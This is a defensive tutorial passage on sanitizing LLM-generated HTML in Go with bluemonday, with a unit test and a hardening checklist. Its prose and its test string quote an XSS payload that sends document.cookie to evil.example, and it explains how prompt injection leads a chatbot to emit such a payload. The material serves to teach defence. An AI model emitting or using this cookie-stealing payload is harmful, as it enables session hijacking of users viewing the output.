### The Scenario: The Chatbot That Executed Its Own Output

Your support bot renders LLM responses as Markdown in the frontend, so `**bold**` and code blocks look nice. An attacker convinces the model (via prompt injection) to include `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">` in its response. If that HTML is rendered without sanitization, it executes in the browser of whoever is viewing the conversation — a classic stored-XSS payload, except the "attacker input" arrived via the LLM instead of a form field.

The fix is identical in spirit to sanitizing any other untrusted HTML: never trust generated content, sanitize server-side before it reaches a browser.

```go
package sanitize

import (
	"github.com/microcosm-cc/bluemonday"
)

// LLMOutputSanitizer strips any HTML/script content from model-generated text,
// allowing only a small safe subset needed for Markdown rendering (bold, code, links).
type LLMOutputSanitizer struct {
	policy *bluemonday.Policy
}

func NewLLMOutputSanitizer() *LLMOutputSanitizer {
	p := bluemonday.NewPolicy()
	p.AllowElements("b", "strong", "i", "em", "code", "pre", "p", "br")
	p.AllowAttrs("href").OnElements("a")
	p.RequireNoFollowOnLinks(true)
	// deliberately NOT allowed: <script>, <img>, <iframe>, onerror/onclick and all other
	// event-handler attributes, style attributes (CSS-based exfiltration), <svg>
	return &LLMOutputSanitizer{policy: p}
}

func (s *LLMOutputSanitizer) Sanitize(llmRawOutput string) string {
	return s.policy.Sanitize(llmRawOutput)
}
```

```go
func TestSanitize_StripsInjectedScriptPayload(t *testing.T) {
	s := NewLLMOutputSanitizer()
	malicious := `Sure, here's your answer. <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`

	clean := s.Sanitize(malicious)

	if strings.Contains(clean, "onerror") || strings.Contains(clean, "<img") {
		t.Fatalf("sanitizer failed to strip payload, got: %s", clean)
	}
}
```

### Defense-in-Depth Checklist

- **Allow-list, never block-list**: `bluemonday`'s policy explicitly allows a small safe tag set — anything not listed is stripped, so a new attack vector (e.g. `<svg onload=...>`) is blocked by default instead of requiring you to anticipate it.
- **Sanitize server-side, not client-side**: client-side sanitization can be bypassed by any client that skips your JS (a mobile app, a curl script, a compromised browser extension).
- **Apply a Content-Security-Policy header** as a second layer, so that even a sanitizer bug doesn't hand an attacker unrestricted script execution.

💡 **Interactive Takeaway**: This is the exact same discipline used in `owasp-top-10-llm-security.md`'s sibling article and in traditional web security — an LLM response is just another form of user-influenced content, and every rule you already apply to untrusted HTML applies here too.
